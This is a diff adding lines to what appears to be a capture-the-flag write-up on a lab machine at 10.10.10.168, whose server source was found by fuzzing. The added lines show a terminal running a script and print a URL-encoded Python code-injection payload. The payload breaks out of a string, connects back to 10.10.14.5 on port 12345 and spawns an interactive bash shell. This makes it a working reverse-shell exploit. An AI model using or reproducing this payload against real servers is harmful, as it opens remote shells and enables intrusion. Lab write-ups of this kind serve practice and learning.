@@ -111,3 +111,12 @@ http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
 // First code 200 response we got was 'develop'
 // Go to: http://10.10.10.168:8080/develop/SuperSecureServer.py
 // Now we have the source code for the server!
+.
+.
+.
+allenwest1@debian:~/Desktop$ nano shell.py                                                                                                          
+allenwest1@debian:~/Desktop$ python3 shell.py 
+payload
+http://10.10.10.168:8080/5%27%0Aimport%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.
+SOCK_STREAM%29%3Bs.connect%28%28%2210.10.14.5%22%2C12345%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.
+fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22/bin/bash%22%2C%22-i%22%5D%29%0Aa%3D%27
